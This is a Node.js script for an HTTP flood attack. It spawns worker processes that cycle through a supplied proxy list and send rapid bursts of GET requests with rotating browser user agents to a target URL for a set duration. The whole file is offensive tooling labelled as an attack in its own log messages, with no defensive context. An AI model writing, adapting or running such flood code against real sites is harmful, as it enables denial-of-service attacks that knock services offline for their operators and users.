const cluster = require('cluster');
const fs = require('fs');
const tls = require('tls');
const { URL } = require('url');
const os = require('os');

if (process.argv.length < 7) {
    console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const rps = parseInt(process.argv[4], 10);
const threads = parseInt(process.argv[5], 10);
const proxyFile = process.argv[6];

let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());
if (proxies.length === 0) {
    console.error("Error: Proxy file is empty or cannot be read.");
    process.exit(1);
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
];

if (cluster.isMaster) {
    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log("Attack completed.");
        process.exit(0);
    }, duration * 1000);

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} exited with code ${code}`);
    });
} else {
    const target = new URL(targetURL);
    let proxyIndex = 0;
    const startTime = Date.now();

    function sendTLSRequest(proxy) {
        const proxyParts = proxy.trim().split(":");
        if (proxyParts.length < 2) return;
        const proxyHost = proxyParts[0];
        const proxyPort = parseInt(proxyParts[1], 10);

        const options = {
            host: proxyHost,
            port: proxyPort,
            servername: target.hostname,
            rejectUnauthorized: false
        };

        const client = tls.connect(options, () => {
            function flood() {
                if (Date.now() - startTime >= duration * 1000) {
                    console.log(`Worker ${process.pid} stopping attack.`);
                    process.exit(0);
                }
                for (let i = 0; i < rps; i++) {
                    const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                                    `Host: ${target.hostname}\r\n` +
                                    `User-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}\r\n` +
                                    "Accept: */*\r\n" +
                                    "Connection: keep-alive\r\n\r\n";
                    client.write(request);
                }
                setTimeout(flood, 100);
            }
            flood();
        });

        client.on("error", () => {
            client.destroy();
        });

        client.on("close", () => {
            client.destroy();
        });
    }

    function attackLoop() {
        if (Date.now() - startTime >= duration * 1000) {
            console.log(`Worker ${process.pid} stopping attack.`);
            process.exit(0);
        }

        const proxy = proxies[proxyIndex];
        proxyIndex = (proxyIndex + 1) % proxies.length;
        sendTLSRequest(proxy);
        setTimeout(attackLoop, 50);
    }

    process.on('uncaughtException', () => {
        process.exit(1);
    });

    attackLoop();
}
